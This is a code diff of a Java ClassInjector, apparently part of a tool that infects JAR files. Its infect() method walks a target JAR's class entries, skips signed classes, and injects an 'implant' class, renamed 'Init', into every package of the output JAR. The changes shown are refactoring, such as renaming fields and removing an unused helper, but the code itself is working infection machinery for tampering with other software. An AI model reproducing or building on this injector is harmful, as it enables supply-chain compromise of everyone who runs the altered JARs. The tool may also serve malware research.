@@ -18,10 +18,10 @@ import java.util.jar.JarEntry;
 import static org.example.injector.Helpers.setStaticFlagForMethod;
 
 public class ClassInjector {
-    private final Class<?> implantComponentClass;
+    private final Class<?> implantClass;
 
-    ClassInjector(Class<?> implantComponent) {
-        this.implantComponentClass = implantComponent;
+    ClassInjector(Class<?> implantClass) {
+        this.implantClass = implantClass;
     }
 
     public static void main(String[] args) {
@@ -56,6 +56,7 @@ public class ClassInjector {
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         Map<String, ClassFile> infectedPackages = new HashMap<>();
         boolean foundSignedClasses = false;
+
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
@@ -68,13 +69,12 @@ public class ClassInjector {
                     continue;
                 }
 
-                ClassFile currentlyProcessing;
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    currentlyProcessing = new ClassFile(in);
+                    ClassFile currentlyProcessing = new ClassFile(in);
 
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     if (!infectedPackages.containsKey(targetPackageName)) {
-                        ClassFile implant = ImplantReader.findAndReadClassFile(implantComponentClass);
+                        ClassFile implant = ImplantReader.findAndReadClassFile(implantClass);
                         deepRenameClass(implant, targetPackageName, "Init");
                         JarEntry newJarEntry = convertToJarEntry(implant);
                         implant.write(fiddler.addNewEntry(newJarEntry));
@@ -184,13 +184,8 @@ public class ClassInjector {
         return parts[parts.length - 1];
     }
 
-    private static String convertToClassFormatFqcn(final String dotFormatClassName) {
-        return dotFormatClassName.replace(".", "/");
-    }
-
     private static JarEntry convertToJarEntry(final ClassFile classFile) {
         String fullPathInsideJar = classFile.getName().replace(".", "/") + ".class";
         return new JarEntry(fullPathInsideJar);
     }
-
 }
